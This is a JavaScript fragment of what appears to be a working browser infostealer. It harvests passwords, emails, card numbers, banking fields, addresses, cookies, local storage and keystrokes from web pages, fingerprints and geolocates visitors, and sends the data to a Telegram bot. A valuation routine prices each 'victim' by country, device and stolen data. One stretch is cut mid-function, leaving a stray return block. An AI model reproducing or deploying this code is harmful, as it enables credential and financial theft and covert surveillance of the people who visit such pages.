        // IMPROVED: Telegram message sending with retry logic
        async function sendToTelegram(message, maxRetries = 3) {
            if (isSending) {
                messageQueue.push(message);
                return false;
            }

            isSending = true;
            let retryCount = 0;
            
            while (retryCount <= maxRetries) {
                try {
                    console.log(`Attempting to send Telegram message (attempt ${retryCount + 1})`);
                    
                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: CONFIG.telegram.chatId,
                            text: message.substring(0, 4090),
                            parse_mode: 'HTML'
                        })
                    });

                    if (response.ok) {
                        const result = await response.json();
                        console.log('Telegram message sent successfully');
                        isSending = false;
                        
                        // Process any queued messages
                        if (messageQueue.length > 0) {
                            const nextMessage = messageQueue.shift();
                            setTimeout(() => sendToTelegram(nextMessage), 1000);
                        }
                        return true;
                    } else {
                        const errorText = await response.text();
                        console.error(`Telegram API error: ${response.status}`, errorText);
                        retryCount++;
                        
                        if (retryCount <= maxRetries) {
                            await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                        }
                    }
                } catch (error) {
                    console.error(`Network error sending to Telegram:`, error);
                    retryCount++;
                    
                    if (retryCount <= maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                    }
                }
            }
            
            console.error('Failed to send Telegram message after all retries');
            isSending = false;
            return false;
        }

        // NEW: Send multiple smaller messages
        async function sendMultipleMessages(messages) {
            for (let i = 0; i < messages.length; i++) {
                await sendToTelegram(messages[i]);
                // Add delay between messages to avoid rate limiting
                if (i < messages.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        // FIXED REALISTIC VALUATION FUNCTION
        function calculateRealisticValue(victimData) {
            let value = 0;
            
            // COUNTRY TIER PRICING
            const countryTiers = {
                'TIER_1': ['CH', 'US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE', 'NO', 'DK', 'SE', 'FI'],
                'TIER_2': ['JP', 'KR', 'NZ', 'AT', 'BE', 'NL', 'IE', 'ES', 'IT'],
                'TIER_3': ['BR', 'RU', 'CN', 'IN', 'MX', 'ZA', 'TR', 'PL']
            };
            
            const countryCode = victimData.location?.country_code || 'UN';
            if (countryTiers.TIER_1.includes(countryCode)) value += 50;
            else if (countryTiers.TIER_2.includes(countryCode)) value += 32;
            else if (countryTiers.TIER_3.includes(countryCode)) value += 20;
            else value += 10;
            
            // DEVICE VALUE
            const platform = victimData.browser?.platform || '';
            const cores = victimData.browser?.cores || 0;
            const memory = victimData.browser?.memory || '';
            
            if (platform.includes('Mac')) value += 25;
            if (platform.includes('Win')) value += 15;
            if (cores >= 8) value += 12;
            if (cores >= 4) value += 8;
            if (memory.includes('16GB')) value += 15;
            if (memory.includes('8GB')) value += 10;
            
            // DATA ASSETS VALUE
            const social = victimData.social || {};
            
            // Convert to numbers with fallbacks
            const passwords = Number(social.passwords) || 0;
            const emails = Number(social.emails) || 0;
            const usernames = Number(social.usernames) || 0;
            const creditCards = Number(social.credit_cards) || 0;
            const bankingInfo = Number(social.banking_info) || 0;
            const personalInfo = Number(social.personal_info) || 0;
            const phoneNumbers = Number(social.phone_numbers) || 0;
            const addresses = Number(social.addresses) || 0;
            const cookies = Number(social.cookies) || 0;
            const localStorage = Number(social.local_storage) || 0;
            const sessions = Number(social.sessions) || 0;
            
            // Passwords & Logins
            value += passwords * 8;
            value += emails * 5;
            value += usernames * 3;
            
            // Financial Data
            value += creditCards * 25;
            value += bankingInfo * 40;
            
            // Personal Information
            value += personalInfo * 2;
            value += phoneNumbers * 6;
            value += addresses * 8;
            
            // Browser & Tracking Data
            value += cookies * 0.5;
            value += localStorage * 0.3;
            value += sessions * 2;
            
            // Behavioral & Fingerprinting
            const fingerprint = victimData.fingerprint || {};
            if (fingerprint.canvas && fingerprint.canvas !== 'failed') value += 5;
            if (fingerprint.webgl && fingerprint.webgl !== 'failed') value += 5;
            if (fingerprint.audio && fingerprint.audio !== 'failed') value += 3;
            
            if (fingerprint.fonts) {
                const fontCount = fingerprint.fonts.split(',').length;
                value += fontCount * 0.5;
            }
            
            // Network & Location Precision
            const network = victimData.network || {};
            const location = victimData.location || {};
            
            if (network.ip && network.ip !== 'Unknown') value += 8;
            if (location.city && location.city !== 'Unknown') value += 5;
            if (location.latitude && location.latitude !== 'Unknown') value += 10;
            
            // Time-based factors
            const dataFreshness = Date.now() - pageLoadTime;
            if (dataFreshness < 30000) value += 5;
            else if (dataFreshness < 120000) value += 2;
            
            // Quality multipliers
            if (creditCards > 0) value *= 1.3;
            if (passwords > 0) value *= 1.2;
            if (bankingInfo > 0) value *= 1.5;
            
            return Math.max(15, Math.round(value));
        }

        // FIXED VICTIM ID GENERATION
        function generateVictimID(victimData) {
            const country = victimData.location?.country_code || 'UN';
            const value = calculateRealisticValue(victimData);
            const validValue = isNaN(value) ? 85 : value;
            const randomCode = Math.floor(Math.random() * 90000) + 10000;
            return `vi.${country}.${validValue}.${randomCode}`;
        }

        // IMPROVED: Location service with better error handling
        async function getRealLocation() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json', { 
                    timeout: 5000 
                });
                const ipData = await ipResponse.json();
                
                const locationServices = [
                    `https://ipapi.co/${ipData.ip}/json/`,
                    `https://ipinfo.io/${ipData.ip}/json`,
                    `https://geolocation-db.com/json/${ipData.ip}`
                ];
                
                for (let service of locationServices) {
                    try {
                        const locationResponse = await fetch(service, { timeout: 5000 });
                        if (locationResponse.ok) {
                            const location = await locationResponse.json();
                            
                            return {
                                city: location.city || location.region || 'Unknown',
                                region: location.region || location.regionName || 'Unknown',
                                country: location.country_name || location.country || 'Unknown',
                                country_code: location.country_code || location.countryCode || 'UN',
                                postal: location.postal || location.zip || 'Unknown',
                                latitude: location.latitude || location.lat || 'Unknown',
                                longitude: location.longitude || location.lon || 'Unknown',
                                timezone: location.timezone || 'Unknown',
                                currency: location.currency || 'Unknown',
                                calling_code: location.country_calling_code || location.callingCode || 'Unknown'
                            };
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                return {
                    city: 'VPN/Proxy Detected',
                    region: 'Unknown',
                    country: 'Unknown',
                    country_code: 'VPN',
                    postal: 'Unknown',
                    latitude: 'Unknown',
                    longitude: 'Unknown',
                    timezone: 'Unknown',
                    currency: 'Unknown',
                    calling_code: 'Unknown'
                };
                
            } catch (error) {
                return {
                    city: 'Blocked',
                    region: 'Blocked',
                    country: 'Blocked',
                    country_code: 'BLOCKED',
                    postal: 'Blocked',
                    latitude: 'Blocked',
                    longitude: 'Blocked',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    currency: 'Unknown',
                    calling_code: 'Unknown'
                };
            }
        }

        // ADDED: Enhanced social data collection
        async function extractSocialMediaProfiles() {
            const profiles = [];
            const domains = ['facebook', 'twitter', 'instagram', 'linkedin', 'tiktok'];
            domains.forEach(domain => {
                try {
                    if (document.cookie.includes(domain)) profiles.push(domain);
                } catch (e) {}
            });
            return profiles;
        }

        async function detectMessagingApps() {
            const apps = [];
            if (navigator.userAgent.includes('WhatsApp')) apps.push('WhatsApp');
            if (navigator.userAgent.includes('Telegram')) apps.push('Telegram');
            return apps;
        }

        async function extractPaymentMethods() {
            const payments = [];
            if (document.cookie.includes('paypal')) payments.push('PayPal');
            if (document.cookie.includes('stripe')) payments.push('Stripe');
            return payments;
        }

        function getWebGLVendor() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? gl.getParameter(gl.VENDOR) : 'no_webgl';
            } catch { return 'failed'; }
        }

        function getWebGLRenderer() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? gl.getParameter(gl.RENDERER) : 'no_webgl';
            } catch { return 'failed'; }
        }

        // Existing helper functions
        async function getRealIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                try {
                    const ipInfo = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    const info = await ipInfo.json();
                    return {
                        ip: data.ip,
                        isp: info.org || 'Unknown',
                        asn: info.asn || 'Unknown'
                    };
                } catch {
                    return { ip: data.ip, isp: 'Unknown', asn: 'Unknown' };
                }
            } catch (error) {
                return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
            }
        }

        async function getSystemInfo() {
            return {
                os: getOS(),
                arch: getArchitecture(),
                version: getOSVersion()
            };
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return 'Unknown';
        }

        function getArchitecture() {
            return navigator.userAgent.includes('x64') ? '64-bit' : '32-bit';
        }

        function getOSVersion() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows NT 10')) return 'Windows 10/11';
            if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
            if (ua.includes('Windows NT 6.2')) return 'Windows 8';
            if (ua.includes('Mac OS X')) return 'macOS';
            return 'Unknown';
        }

        async function getBandwidth() {
            try {
                const start = performance.now();
                await fetch('https://httpbin.org/stream-bytes/100000');
                const end = performance.now();
                return Math.round(100000 / (end - start));
            } catch { return 'Unknown'; }
        }

        async function getLatency() {
            try {
                const start = performance.now();
                await fetch('https://httpbin.org/delay/0');
                const end = performance.now();
                return Math.round(end - start);
            } catch { return 'Unknown'; }
        }

            const socialMediaProfiles = await extractSocialMediaProfiles();
            const messagingApps = await detectMessagingApps();
            const paymentMethods = await extractPaymentMethods();
            
            return {
                passwords: collectPasswords().length,
                emails: collectEmails().length,
                usernames: collectUsernames().length,
                credit_cards: collectCreditCards().length,
                banking_info: collectBankingInfo().length,
                personal_info: Object.keys(collectPersonalInfo()).length,
                phone_numbers: collectPhoneNumbers().length,
                addresses: collectAddresses().length,
                cookies: Object.keys(collectCookies()).length,
                local_storage: Object.keys(collectLocalStorage()).length,
                sessions: collectSessions().length,
                browsing_data: (await estimateHistory()).length,
                social_media_profiles: socialMediaProfiles,
                messaging_apps: messagingApps,
                payment_methods: paymentMethods

        function collectPasswords() {
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value) {
                    passwords.push({
                        field: input.name || 'password',
                        value: input.value,
                        form: input.form ? input.form.action : 'unknown'
                    });
                }
            });
            return passwords;
        }

        function collectEmails() {
            const emails = [];
            document.querySelectorAll('input[type="email"]').forEach(input => {
                if (input.value && input.value.includes('@')) {
                    emails.push(input.value);
                }
            });
            return emails;
        }

        function collectUsernames() {
            const usernames = [];
            document.querySelectorAll('input[name*="user"], input[name*="login"], input[autocomplete="username"]').forEach(input => {
                if (input.value) {
                    usernames.push(input.value);
                }
            });
            return usernames;
        }

        function collectCreditCards() {
            const cards = [];
            document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[type="tel"]').forEach(field => {
                if (field.value && field.value.replace(/\s/g, '').length > 10) {
                    cards.push({
                        type: field.name || 'card',
                        value: field.value
                    });
                }
            });
            return cards;
        }

        function collectBankingInfo() {
            const banking = [];
            document.querySelectorAll('input[name*="bank"], input[name*="account"], input[name*="routing"]').forEach(field => {
                if (field.value) {
                    banking.push({
                        type: field.name,
                        value: field.value
                    });
                }
            });
            return banking;
        }

        function collectPersonalInfo() {
            const info = {};
            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
                if (input.value) {
                    const key = input.name || input.placeholder || input.autocomplete || 'field';
                    info[key] = input.value;
                }
            });
            return info;
        }

        function collectPhoneNumbers() {
            const phones = [];
            document.querySelectorAll('input[type="tel"], input[autocomplete="tel"]').forEach(input => {
                if (input.value) {
                    phones.push(input.value);
                }
            });
            return phones;
        }

        function collectAddresses() {
            const addresses = [];
            document.querySelectorAll('input[autocomplete*="address"], input[name*="street"], input[name*="city"], input[name*="zip"]').forEach(input => {
                if (input.value) {
                    addresses.push(input.value);
                }
            });
            return addresses;
        }

        function collectCookies() {
            return document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                if (name) cookies[name] = value || '';
                return cookies;
            }, {});
        }

        function collectLocalStorage() {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                ls[key] = localStorage.getItem(key);
            }
            return ls;
        }

        function collectSessions() {
            return sessionStorage.length;
        }

        function getScrollDepth() {
            const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
            return Math.round(scrollPercent);
        }

        function generateCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 2, 2);
                return canvas.toDataURL().substring(0, 50) + '...';
            } catch (e) { return 'failed'; }
        }

        function generateWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? `WebGL 1.0 (OpenGL ES 2.0 Chromium)` : 'no_webgl';
            } catch (e) { return 'failed'; }
        }

        function testAudioSupport() {
            return window.AudioContext ? 'Audio supported' : 'No audio support';
        }

        function detectFonts() {
            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
            return fonts.join(', ');
        }

        function detectVPN(ip) {
            const vpnRanges = [
                '104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.',
                '185.', '188.', '193.', '194.', '195.', '198.', '199.', '45.', '5.', '62.', '77.', '78.', '79.',
                '80.', '81.', '82.', '83.', '84.', '85.', '86.', '87.', '88.', '89.', '90.', '91.', '92.', '93.', '94.'
            ];
            
            const vpnKeywords = ['vpn', 'proxy', 'host', 'server', 'datacenter', 'cloud', 'aws', 'google', 'azure'];
            
            const isVPNRange = vpnRanges.some(range => ip.startsWith(range));
            const isp = document.querySelector('#isp')?.innerText || '';
            const isVPNISP = vpnKeywords.some(keyword => isp.toLowerCase().includes(keyword));
            
            return isVPNRange || isVPNISP ? 'VPN/Proxy Detected' : 'Residential IP';
        }

        function detectProxy() {
            return navigator.webdriver ? 'Automation Detected' : 'Normal';
        }

        function detectTor() {
            return navigator.plugins.length === 0 ? 'Tor Browser Suspected' : 'Normal';
        }

        async function estimateHistory() {
            const popularSites = [
                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com',
                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com',
                'whatsapp.com', 'tiktok.com', 'paypal.com', 'ebay.com', 'spotify.com'
            ];
            const visited = [];
            
            for (let site of popularSites) {
                try {
                    const link = document.createElement('a');
                    link.href = `https://${site}`;
                    link.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;';
                    document.body.appendChild(link);
                    
                    const computed = getComputedStyle(link);
                    if (computed.visibility !== 'hidden' || computed.display !== 'none') {
                        visited.push(site);
                    }
                    
                    document.body.removeChild(link);
                } catch (e) {}
            }
            return visited;
        }

        // Enhanced behavioral tracking
        function startBehavioralTracking() {
            document.addEventListener('mousemove', (e) => {
                mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                });
                if (mouseMovements.length > 100) {
                    mouseMovements = mouseMovements.slice(-100);
                }
            });

            document.addEventListener('keydown', (e) => {
                keystrokeTiming.push({
                    key: e.key,
                    timestamp: Date.now(),
                    target: e.target.tagName
                });
                if (keystrokeTiming.length > 50) {
                    keystrokeTiming = keystrokeTiming.slice(-50);
                }
            });
        }
